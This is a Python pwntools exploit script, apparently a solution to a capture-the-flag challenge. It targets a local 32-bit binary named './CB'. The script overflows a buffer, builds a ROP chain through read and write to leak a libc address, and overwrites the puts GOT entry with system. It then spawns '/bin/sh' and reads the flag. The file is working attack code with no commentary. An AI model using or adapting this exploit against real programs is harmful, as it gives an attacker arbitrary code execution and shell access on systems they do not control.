from pwn import *
 
context.log_level='debug'
 
s=process('./CB')

e=ELF('./CB')

buf="A"*128+"B"*8

bss=0x0804a030

puts_plt=e.plt['puts']
puts_got=e.got['puts']
read_plt=e.plt['read']
read_got=e.got['read']
write_plt=e.plt['write']
write_got=e.got['write']

pppr=0x080486b9
offset=0xf7eea350-0xf7e50940

payload=buf

payload+=p32(read_plt)
payload+=p32(pppr)
payload+=p32(0x0)
payload+=p32(bss)
payload+=p32(len(("/bin/sh\00")))

payload+=p32(write_plt)
payload+=p32(pppr)
payload+=p32(0x1)
payload+=p32(read_got)
payload+=p32(0x4)

payload+=p32(read_plt)
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(puts_got)
payload+=p32(0x4)

payload+=p32(puts_plt)
payload+=p32(0x41414141)
payload+=p32(bss)

s.recvuntil('Very Hard Buffer OverFLow World!!!\n')
s.sendline(payload)
sleep(1)

s.send("/bin/sh\00")

sleep(1)
read_libc=u32(s.recv(4))

print "read@libc: "+str(hex(read_libc))
system_libc=read_libc-offset

sleep(1)
print "read@got: "+str(hex(read_got))
print "system@libc: "+str(hex(system_libc))
s.send(p32(system_libc))

sleep(1)

s.sendline('cat ./flag')

print "flag: "+s.recv(1024)
